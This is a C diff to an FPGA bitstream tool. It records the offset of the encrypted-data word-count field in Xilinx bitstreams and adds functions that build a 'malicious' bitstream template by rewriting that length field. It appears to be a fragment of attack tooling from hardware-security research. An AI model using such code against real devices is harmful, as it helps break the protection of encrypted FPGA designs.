@@ -125,6 +125,7 @@ int xilinx_read_bit_file(struct xilinx_bit_file *bit_file, const char *filename)
 		return ERROR_PLD_FILE_LOAD_FAILED;
 
 	bit_file->cipher_start = 0;
+	bit_file->dwc_length_offset = 0;
 	bit_file->dwc_length = 0;
 	bit_file->rolling_delta = 0x00;
 	// find dwc 30034001
@@ -134,9 +135,10 @@ int xilinx_read_bit_file(struct xilinx_bit_file *bit_file, const char *filename)
 		{
 			if (bit_file->data[i] == 0x30 && bit_file->data[i + 1] == 0x03 && bit_file->data[i + 2] == 0x40 && bit_file->data[i + 3] == 0x01)
 			{
-				bit_file->cipher_start = i + 8;
+				bit_file->dwc_length_offset = i + 4;
 				bit_file->dwc_length = be_to_h_u32(&bit_file->data[i + 4]); // len in word
-				bit_file->rolling_delta = bit_file->data[i + 8 + 0x3b];
+				bit_file->cipher_start = i + 8;
+				bit_file->rolling_delta = bit_file->data[bit_file->cipher_start + 0x3b];
 				break;
 			}
 		}
@@ -147,5 +149,31 @@ int xilinx_read_bit_file(struct xilinx_bit_file *bit_file, const char *filename)
 
 	fclose(input_file);
 
+	return ERROR_OK;
+}
+
+int generate_malicious_bit_template(struct xilinx_bit_file *bit_file, struct xilinx_bit_file *bit_file_mod){
+	bit_file_mod->length = bit_file->dwc_length_offset + 4 + MAL_ENC_DWC_WORD_LEN_MAX * 4;
+	bit_file_mod->data = malloc(bit_file_mod->length);
+	bit_file_mod->dwc_length = MAL_ENC_DWC_WORD_LEN_MAX;
+	uint32_t dwc_length_bswapped = bswap32(MAL_ENC_DWC_WORD_LEN_MAX);
+	bit_file_mod->dwc_length_offset = bit_file->dwc_length_offset;
+	bit_file_mod->cipher_start = bit_file->cipher_start;
+	memcpy(bit_file_mod->data, bit_file->data, bit_file_mod->length);
+	memcpy(&bit_file_mod->data[bit_file_mod->dwc_length_offset], &dwc_length_bswapped, 4);
+	return ERROR_OK;
+}
+
+int change_dwc_len(struct xilinx_bit_file *bit_file_mod){
+	if(bit_file_mod->dwc_length > MAL_ENC_DWC_WORD_LEN_MAX){
+		bit_file_mod->dwc_length = MAL_ENC_DWC_WORD_LEN_MAX;
+	}
+
+	if(bit_file_mod->dwc_length < MAL_ENC_DWC_WORD_LEN_MIN){
+		bit_file_mod->dwc_length = MAL_ENC_DWC_WORD_LEN_MIN;
+	}
+	bit_file_mod->length = bit_file_mod->dwc_length_offset + 4 + bit_file_mod->dwc_length * 4;
+	uint32_t dwc_length_bswapped = bswap32(bit_file_mod->dwc_length);
+	memcpy(&bit_file_mod->data[bit_file_mod->dwc_length_offset], &dwc_length_bswapped, 4);
 	return ERROR_OK;
 }
